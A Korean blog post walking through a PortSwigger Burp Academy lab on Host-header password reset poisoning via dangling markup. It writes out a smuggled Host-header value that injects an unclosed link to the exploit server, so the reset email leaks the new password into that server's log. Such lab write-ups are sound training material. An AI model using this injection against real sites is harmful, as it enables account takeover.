---
layout: post
title: "Burp Academy-Host 헤더 관련 취약점: Password reset poisoning via dangling markup"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Host헤더]
toc: true
last_modified_at: 2023-12-18 09:50:00 +0900
---

# 개요
- HTTP Host 헤더 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup
- 취약점 설명페이지: https://portswigger.net/web-security/host-header
- 난이도: EXPERT (어려움)

# 랩 개요
- 이 랩은 dangling markup을 통한 password reset poisoning 취약점이 있다. 
- wiener:peter로 로그인할 수 있다. 이 계정으로 보낸 메일은 exploit서버에서 확인할 수 있다. 
- Carlos 유저의 계정으로 로그인하면 문제가 풀린다. 
- 힌트: 서버측에 바이러스 스캔 SW가 동작하고 있다. 이메일 링크를 스캔하고 있다. 

```
This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

Hint. Some antivirus software scans links in emails to identify whether they are malicious.
```

# 풀이 시도 
- 드디어 호스트 헤더 인젝션 문제들중에서 가장 마지막 끝판왕문제가 나왔다. 
- 호스트헤더 인젝션문제들 중에서 가장 먼저 풀었던 문제-패스워드 재설정 링크-의 강화판이다. 서버측에 바이러스 스캔 SW가 동작하고 있다. email링크 스캔을 우회하는 방법을 생각해야 한다. 

이제까지 배운 테크닉들 다 써본다. 
- 더블 Host헤더 : 안됨
- 싱글 커넥션으로 두 개의 서로다른 Host헤더 요청 연속으로 보내기: 안됨
- 싱글 커넥션으로 두 개의 서로다른 Host헤더 요청 동시에 보내기 (레이스 컨디션): 안됨
- 서브도메인 (도메인 전방일치, ex) 0a3a009d031c412f844c2324006800d9.web-security-academy.net.exploit-0a9f00e60350411f847222b901da00da.exploit-server.net): 안됨
- URL에 절대경로 지정: 안됨 
- Burp Collaborator: 안됨
- uppercase (EXPLOIT-0A9F00E60350411F847222B901DA00DA.EXPLOIT-SERVER.NET): 안됨
- 도메인연결스트링:0a3a009d031c412f844c2324006800d9.web-security-academy.net@@exploit-0a9f00e60350411f847222b901da00da.exploit-server.net: 안됨 

음.. 다 안된다. 답을 본다. 

# 답 보고 풀이
1. 패스워드 메일 전송 과정을 유심히 살펴본다. 

새로운 패스워드가 이메일에 바로 적혀있는 것을 알 수 있다. (눈치가 빠르다면 exploit서버의 억세스로그를 통해 패스워드를 알아내는 방식이라고 유추할 수 있다.)

![새로운 패스워드 확인](/images/burp-academy-host-header-7-1.png)

또한 exploit서버와의 통신도 Burp Proxy로 확인해보면 `GET /email` 요청의 응답을 볼 수 있다. 

이를 통해 다음을 알 수 있다. (또는 유추할 수 있다. )
- 화면에 보며지는 부분의 HTML코드가 일단 data-dirty라는 속성으로 표시된다.
- DOMPurity를 사용해서 sanitize한 값을 HTML 페이지에 렌더링한다. 
- 아마도 Host헤더의 값이 /login 링크의 도메인 값으로 설정된다. 

![/email 응답 확인](/images/burp-academy-host-header-7-2.png)

2. Host헤더 인젝션이 가능한 값을 알아낸다. 

- 테스트해보면 포트 부분(:이후 값)은 체크를 하지 않는다는 것을 알 수 있다. 
- 그리고 email 을 확인해보면 포트부분 이후가 링크로 나타나는 것을 볼 수 있다. 

![Host헤더 인젝션이 가능한 값 확인](/images/burp-academy-host-header-7-4.png)


3. 따라서 포트 부분에 exploit서버의 링크를 넣어서 보내본다. 다음과 같다.

```
0a6900b4045d301a806780b900580067.web-security-academy.net:'<a href="//exploit-0a8a00a4046b303b80857fd101fb000c.exploit-server.net/?
```

그러면 200응답이 회신된다. exploit서버를 확인해본다. 그러면 다음과 같이 HTML의 화면이 일부분만 표시되는 것을 볼 수 있다. 

![/email 응답 확인2](/images/burp-academy-host-header-7-3.png)

이 때의  email 응답 페이지는 다음과 같다. 삽입한 a 태그를 볼 수 있다. 원래의 a 태그가 닫히기 전에 또 다른 a 태그가 삽입된 것이다(dangling a tag). 웹 브라우저에 따라서는 유저가 클릭했을 때 새로 삽입된 a 태그가 동작되기도 하는 것 같다. (크롬에서는 클릭해보면 about:blank#blocked 라는 링크로 이동된다.)

![/email 응답 확인3](/images/burp-academy-host-header-7-5.png)

4. exploit서버의 억세스 로그를 보면 유저가 링크를 클릭해서 로그가 남겨진 것을 볼 수 있다. 여기에 패스워드도 포함되어 있다. 

![exploit서버 억세스 로그확인](/images/burp-academy-host-header-7-6.png)

5. 이제 같은 요령으로 `POST /forgot-password` 요청에서 username을 carlos로 변경해서 요청을 보낸다. 그리고 exploit서버 억세스 로그를 확인해보면 carlos유저가 링크를 클릭한 로그를 볼 수 있다. 이 패스워드로 로그인하면 문제가 풀린다. 

![풀이 성공](/images/burp-academy-host-header-7-success.png)
